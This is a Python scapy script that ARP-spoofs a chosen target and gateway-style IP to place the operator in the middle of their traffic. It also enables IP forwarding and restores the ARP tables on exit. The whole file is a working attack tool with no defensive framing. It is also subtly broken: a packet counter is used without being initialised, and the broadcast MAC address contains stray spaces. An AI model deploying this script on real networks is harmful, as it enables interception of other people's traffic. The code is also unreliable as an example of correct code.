#Need to allow port forwrding in your system:
# $echo 1 > /proc/sys/net/ipv4/ip_forward 

import scapy.all as scapy
import optparse
import time
import sys

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--targetip", dest="target_ip", help="IP address of the target.")
    parser.add_option("-s", "--spoofip", dest="spoof_ip", help="Ip address of the spoofer")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please provide the ip address of the target, use --help for more info.")
    if not options.spoof_ip:
        parser.error("[-] Please provide the ip address of the spoofer, use --help for more info")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff  ")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst= destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
try:
    while True:
        spoof(options.target_ip, options.spoof_ip)
        spoof(options.spoof_ip,options.target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C.............Quiting.")
    restore(options.target_ip, options.spoof_ip)
    restore(options.spoof_ip, options.target_ip)
    